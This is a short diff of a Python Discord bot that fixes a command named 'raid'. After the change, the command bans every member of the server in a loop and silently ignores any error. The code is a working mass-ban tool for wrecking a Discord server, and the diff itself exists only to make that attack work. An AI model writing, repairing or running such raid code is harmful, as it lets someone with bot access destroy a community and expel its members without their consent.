@@ -12,14 +12,15 @@ async def on_ready():
 
 
 @bot.command(pass_context = True)
-async def raid(ctx,*,guild):
-  for member in ctx.guild.members:
-    member = [member.id for member in guild.members]   
-    await bot.ban(member)
-    
+async def raid(ctx):
+  for user in ctx.guild.members:
+        try:
+            await user.ban()
+        except:
+            pass
 
-    
-    
+
+
 
 
 bot.run('token')
